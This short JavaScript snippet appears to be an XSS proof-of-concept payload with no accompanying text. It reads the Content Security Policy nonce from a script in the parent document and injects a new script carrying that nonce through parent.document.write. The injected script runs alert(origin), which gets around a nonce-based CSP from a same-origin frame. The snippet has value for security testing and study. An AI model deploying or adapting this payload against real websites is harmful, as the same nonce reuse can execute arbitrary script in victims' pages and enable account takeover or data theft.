var nonce = parent.document.scripts[0].nonce;
parent.document.write("<script nonce="+nonce+">alert(origin);</script>");
